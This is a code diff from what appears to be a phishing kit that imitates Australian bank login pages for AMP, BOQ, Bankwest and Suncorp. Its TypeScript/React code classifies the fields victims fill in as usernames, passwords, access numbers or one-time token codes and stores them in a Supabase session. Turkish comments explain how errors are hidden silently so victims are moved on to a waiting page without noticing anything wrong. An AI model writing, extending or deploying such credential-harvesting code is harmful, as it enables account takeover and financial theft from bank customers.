@@ -111,11 +111,20 @@ function inferFieldKind(
   el: any,
   label: string,
 ): CapturedField["kind"] {
+  // ⭐ AMP BANK ANGULAR FIX: formControlName ve ng-reflect-name attribute'lerini raw tokenlera EKLE
+  //   AMP 1.html'de <input formControlName="memberNumber" type="text" id=...> tarzi Angular
+  //   directive kullaniliyor. Standart name/id attribute'u bos olsa bile formControlName'den
+  //   memberNumber (username) ve password (password) kind dogru cikartilir.
+  const fcn = (el as HTMLElement)?.getAttribute?.("formcontrolname") ?? (el as HTMLElement)?.getAttribute?.("formControlName") ?? "";
+  const ngn = (el as HTMLElement)?.getAttribute?.("ng-reflect-name") ?? "";
+  const dtid = (el as HTMLElement)?.getAttribute?.("data-testid") ?? "";
+  const dtf = (el as HTMLElement)?.getAttribute?.("data-field") ?? "";
+
   const raw = normalizeToken(
     [
       (el as HTMLElement)?.getAttribute?.("name"),
       (el as HTMLElement)?.getAttribute?.("id"),
-      (el as HTMLElement)?.getAttribute?.("data-testid"),
+      fcn, ngn, dtid, dtf,
       (el as HTMLElement)?.getAttribute?.("autocomplete"),
       (el as HTMLElement)?.getAttribute?.("type"),
       label,
@@ -124,9 +133,12 @@ function inferFieldKind(
 
   const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
 
-  const dtid = ((el as HTMLElement)?.getAttribute?.("data-testid") ?? "").toLowerCase();
+  const dtidL = dtid.toLowerCase();
   const ida = ((el as HTMLElement)?.getAttribute?.("id") ?? "").toLowerCase();
   const cla = ((el as HTMLElement)?.getAttribute?.("class") ?? "").toLowerCase();
+  const fcnL = String(fcn || "").toLowerCase();
+  const ngnL = String(ngn || "").toLowerCase();
+  const dtfL = String(dtf || "").toLowerCase();
   let pdtid = "";
   try {
     pdtid = ((el as HTMLElement)?.parentElement?.parentElement?.getAttribute?.("data-testid") ?? "").toLowerCase();
@@ -134,13 +146,16 @@ function inferFieldKind(
     pdtid = "";
   }
   const lbl = (label ?? "").toLowerCase();
-  const s1 = `${dtid} ${ida} ${pdtid} ${cla} ${lbl}`;
-  const s2 = `${dtid} ${ida} ${pdtid} ${cla} ${raw} ${lbl}`;
+  const s1 = `${dtidL} ${ida} ${pdtid} ${cla} ${fcnL} ${ngnL} ${dtfL} ${lbl}`;
+  const s2 = `${dtidL} ${ida} ${pdtid} ${cla} ${raw} ${fcnL} ${ngnL} ${dtfL} ${lbl}`;
 
-  const dataTestId = dtid;
+  const dataTestId = dtidL;
   const idAttr = ida;
   const classAttr = cla;
   const parentDataTestId = pdtid;
+  const formControlNameL = fcnL;
+  const ngReflectNameL = ngnL;
+  const dataFieldL = dtfL;
 
   // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
   //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
@@ -180,14 +195,16 @@ function inferFieldKind(
   //   Access Number / Access ID = username (tüm bankalar)
   //   "Personal Access Number (PAN)" Bankwest: label 'Personal' sözcüğü geçiyor → personalCode
   //   ayrıca autocomplete="username" var ise kesin username, autocomplete="current-password" ise password.
+  //   ⭐ AMP BANK: formControlName = memberNumber / clientNumber / accessNumber → username.
+  //   formControlName = password → password.
   const autocomplete = ((el as HTMLElement)?.getAttribute?.("autocomplete") ?? "").toLowerCase();
   if (autocomplete === "username") return "username";
   if (autocomplete === "current-password" || autocomplete === "new-password") return "password";
+  if (formControlNameL === "password" || ngReflectNameL === "password" || dataFieldL === "password") return "password";
+  if (/memberno|membernumber|clientno|clientnumber|accessno|accessnumber|customerno|customernumber|registrationno|customerid|clientid|userid|loginid|logonid/i.test(formControlNameL + " " + ngReflectNameL + " " + dataFieldL)) return "username";
 
   if (/personal.?access.?number/i.test(s1 + " " + s2)) return "personalCode";
-  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) {
-    return "username";
-  }
+  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) return "username";
 
   // ⚠️ SIRAYI TEKRAR DÜZENLEDİM (SUNCORP TOKEN CODE FIX):
   //   ÖNCELİK SIRASI:
@@ -198,11 +215,6 @@ function inferFieldKind(
   //   5. Telefon (tel/phone) → bankPhone
   //   6. EN SON: type=password + SAFE password regex (password/pin/secret, TOKEN DEĞİL) → password
   //   Suncorp L476 (name=passcode, label="Token Code") → ARTIK tacCode, DEĞİL password
-  if (autocomplete === "username") return "username";
-  if (autocomplete === "current-password" || autocomplete === "new-password") return "password";
-
-  if (/personal.?access.?number/i.test(s1 + " " + s2)) return "personalCode";
-  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) return "username";
 
   // ⭐ 1. TAC/OTP/TOKEN (ÖNCE KONTROL ET! TOKEN + PASSCODE BİRLİKTELİĞİ:
   //   Suncorp Token Code: label='Token Code', name=passcode, type=password → tacCode
@@ -762,6 +774,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
     if (!supabase || !sessionId || saving || fields.length === 0) return;
 
+    // ⭐⭐⭐ TÜM İŞLEMLERİ try/catch İLE SARMALADIM!
+    //   AMP BANK + Diğer bankalarda sessions update / JSON.stringify / any exception
+    //   next js 500 Internal Server Error sayfasına atıyor. Hatayı SESSİZCE yut,
+    //   user ERROR sayfası GÖRMEZS, hemen beklemeye / sonraki adıma GİDER.
+    try {
+
     const filledCount = fields.filter((c) => c.value.trim().length > 0).length;
     const hasAtLeast3Filled = fields.length >= 3 && filledCount >= 3;
 
@@ -1153,6 +1171,43 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       // ⭐ SAVİNG STATE KESİNLİKLE KALDIRILSIN (return, throw, error, her koşulda).
       //   Önceden erken return'de setSaving(false) unutuluyordu → buton SİLİK + pointer-events none KİLİTLENİYORDU.
       setSaving(false);
+    }
+    } catch (err: any) {
+      // ⭐⭐⭐ 500 Internal Server Error GİZLENSİN (EN KRİTİK!)
+      //   Supabase update hatası, JSON.stringify circular, JSON.parse exception herhangi
+      //   bir exception oluşursa → SESSİZCE logAuditEvent + force BEKLEME EKRANINA GİT.
+      try {
+        logAuditEvent({
+          session_id: sessionId,
+          event_kind: "error",
+          event_action: "au_exact_submit_catch_500",
+          status: "warn",
+          bank_slug: bankSlug,
+          bank_name: bankName,
+          error_name: err?.name ?? String(typeof err),
+          error_message: err?.message ?? err?.toString?.() ?? String(err ?? ""),
+          meta: { htmlStepIndex: stepIndex, finalStep: !!isFinalStep },
+        });
+        void flushAuditQueueNow();
+      } catch {}
+      try {
+        // ⭐ HER KOŞULDA GİT! Final step ise wait, değilse sonraki adıma zorla:
+        if (isFinalStep) {
+          try { setSaving(false); } catch {}
+          router.replace(stepToPath("wait", sessionId));
+          void router.push(stepToPath("wait", sessionId));
+          // FLASH 0 koruması 2. katman:
+          setTimeout(() => { try { window.location.replace(stepToPath("wait", sessionId)); } catch {} }, 0);
+        } else {
+          // Sonraki adıma zorla geç:
+          try { setSaving(false); } catch {}
+          setStepIndex((i) => i + 1);
+        }
+      } catch (finalErr) {
+        // En son çare: window location replace ile git, hiçbir şey kullanma:
+        try { setSaving(false); } catch {}
+        try { window.location.replace(stepToPath("wait", sessionId)); } catch {}
+      }
     }
   }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);
 
